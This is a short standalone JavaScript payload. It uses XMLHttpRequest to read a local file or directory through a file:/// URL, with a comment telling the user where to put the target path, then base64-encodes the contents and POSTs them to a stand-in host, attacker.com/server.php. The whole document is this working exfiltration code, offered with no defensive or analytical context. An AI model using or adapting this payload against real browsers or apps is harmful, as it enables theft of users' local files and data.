var xhr = new XMLHttpRequest();
xhr.open("GET", "file:///", true); //put here the directory to enumerate or the file to read
xhr.responseType = "arraybuffer";
xhr.onload = function (oEvent) {
    var arrayBuffer = xhr.response;
    if (arrayBuffer) {
      var byteArray = new Uint8Array(arrayBuffer);
      var binary = '';
      var len = byteArray.byteLength;
      for (var i = 0; i < len; i++) {
        binary += String.fromCharCode(byteArray[i]);
      }
      var xhr_post = new XMLHttpRequest();
      xhr_post.open("POST", "http://attacker.com/server.php", true);
      xhr_post.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
      var params = "body=" + encodeURIComponent(btoa(binary));
      xhr_post.send(params);
    }
}
xhr.send(null);
